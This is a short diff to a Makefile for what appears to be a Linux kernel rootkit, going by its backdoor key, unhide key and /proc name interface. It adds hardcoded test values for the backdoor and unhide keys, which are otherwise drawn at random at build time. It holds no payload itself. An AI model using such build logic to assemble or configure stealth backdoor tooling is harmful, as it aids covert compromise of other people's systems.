@@ -11,8 +11,15 @@ AS=$(shell which as)
 CTAGS=$(shell which ctags)
 JOURNALCTL := $(shell which journalctl)
 UUIDGEN := $(shell uuidgen)
+
+# For tests, use hardcoded keys.
+ifndef TEST_ENV
 BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
+else
+BDKEY=0x7d3b1cb572f16425
+UNHIDEKEY=0x2
+endif
 
 # PROCNAME, /proc/<name> interface.
 COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
